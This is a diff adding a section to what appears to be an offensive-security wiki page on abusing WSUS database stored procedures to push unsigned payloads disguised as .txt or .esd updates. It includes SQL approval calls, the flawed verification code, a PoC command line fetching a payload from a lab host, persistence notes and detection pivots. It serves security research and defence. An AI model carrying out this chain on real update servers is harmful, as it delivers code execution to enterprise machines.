@@ -357,6 +357,77 @@ config case_sensitive = false
 
 These patterns generalize to any updater that accepts unsigned manifests or fails to pin installer signers—network hijack + malicious installer + BYO-signed sideloading yields remote code execution under the guise of “trusted” updates.
 
+
+---
+## WSUS/SUSDB custom-update abuse: unsigned payloads via `.txt`/`.esd`
+
+This is a different trust-boundary failure from intercepting an HTTP WSUS connection: the prerequisite is enough access to the **WSUS database (`SUSDB`) stored procedures** to publish and approve a custom update. One practical entry path is relaying an upstream WSUS computer account to a separate MSSQL server hosting `SUSDB`; the exact prerequisite is deployment-specific, so first enumerate `EXECUTE` permissions instead of assuming SQL administrator rights.<sup>[[16]](#references)[[17]](#references)</sup>
+
+### Build, target and approve the update
+
+The custom-update workflow uses legitimate WSUS procedures as a restricted publishing API. The important state transitions are:<sup>[[16]](#references)</sup>
+
+| Stage | Relevant stored procedures |
+| --- | --- |
+| Import update metadata | `spImportUpdate` |
+| Store prerequisite, localized and extended XML fragments | `spSaveXMLFragment` |
+| Associate the content digest with its attacker-controlled URL | `spSetBatchURL` |
+| Enumerate/create a computer group and add the client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
+| Approve installation for that group | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |
+
+The file name, digests, size and `CommandLineInstallation` handler must agree across the imported metadata/fragments. After assigning the content URL and target group, the final approval resembles the following; use fresh update, group and deployment identifiers rather than replaying example GUIDs.<sup>[[16]](#references)[[17]](#references)</sup>
+
+```sql
+EXEC spDeployUpdate
+  @updateID = '<update-guid>', @revisionNumber = 1,
+  @actionID = 0, @targetGroupID = '<group-guid>',
+  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
+  @adminName = 'Administrator';
+```
+
+### Extension-driven signature bypass
+
+WSUS normally rejects arbitrary unsigned executable content. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, however, the .NET `VerifyFile` path sets its certificate-check flag to false when the supplied filename ends in `.txt` or `.esd`; `CheckCertificateSignature` is then skipped without first proving that the bytes are text or a legitimate ESD image. Therefore an unchanged PE named, for example, `payload.exe.txt` can pass content verification and later be launched by the update's command-line installation handler. This is a policy/type-confusion bug, not signature forgery.<sup>[[17]](#references)</sup>
+
+```csharp
+bool checkSignature = true;
+if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
+    checkSignature = false;
+if (checkSignature)
+    CheckCertificateSignature(/* downloaded file */);
+```
+
+### BITS-compatible staging and automation
+
+Calling `spDeployUpdate` makes WSUS fetch the registered content. The origin must satisfy BITS' HTTP expectations: a reachable URL alone is insufficient because the transfer uses an initial `HEAD`/`GET` flow and byte-range requests. A server without Range support produces WSUS synchronization `EventId=364` stating that BITS requires the Range protocol header.<sup>[[17]](#references)</sup>
+
+The research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generates the SQL required for the import/fragment/URL/group/deployment chain, includes a modified MSSQL client for executing it, and ships `BitsWebServer.py` for content staging. A minimal authorized-lab invocation is:<sup>[[18]](#references)</sup>
+
+```bash
+python3 NotWSUSpicious.py \
+  --wsusHostname wsus.lab.local \
+  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
+  --updateName SecurityUpdate \
+  --updateFilePath /payloads/payload.exe.txt \
+  --updateArguments '' \
+  --computerGroup TestGroup \
+  --targetComputer workstation.lab.local
+python3 BitsWebServer.py
+```
+
+### Unattended execution and retry persistence
+
+Client-side interaction depends on policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, option `4 - Auto download and schedule install`, makes an approved update download and install on the configured schedule without the user manually selecting it. In testing, a payload whose update remained failed/incomplete was immediately offered again after the callback process exited, so retry behavior can become recurring execution persistence; it is noisy because the client exposes an update-failed state.<sup>[[17]](#references)</sup>
+
+### Detection and hardening pivots
+
+Useful server- and client-side pivots from this chain are:<sup>[[17]](#references)</sup>
+
+- Audit `SUSDB` execution of `spCreateTargetGroup`, `spSetBatchURL` and `spDeployUpdate`; investigate new targeting groups, external content origins, `.txt`/`.esd` update payloads and deployments performed by unexpected principals (especially non-computer accounts).
+- Review `C:\Program Files\Update Services\LogFiles` for `ContentSyncAgent`, `FileVerified`, the misspelled `FileVerficationFailed`, and `EventId=364`; correlate verification with payload extension and content magic rather than trusting the suffix.
+- Hunt for Windows Update installation repeatedly failing/retrying and for PE execution or unexpected child/network activity from content carrying `.txt` or `.esd` names.
+- Require Extended Protection for Authentication on the database service where supported, and restrict database network access to the WSUS server and authorized administrative systems. Minimize and audit `EXECUTE` rights on the custom-update procedures.
+
 ---
 ## References
 - [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
@@ -374,5 +445,8 @@ These patterns generalize to any updater that accepts unsigned manifests or fail
 - [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
 - [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
 - [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
+- [16] [SpecterOps – Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
+- [17] [SpecterOps – Turning Enterprise Update Servers Into Backdoor Factories (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
+- [18] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
 
 {{#include ../../banners/hacktricks-training.md}}
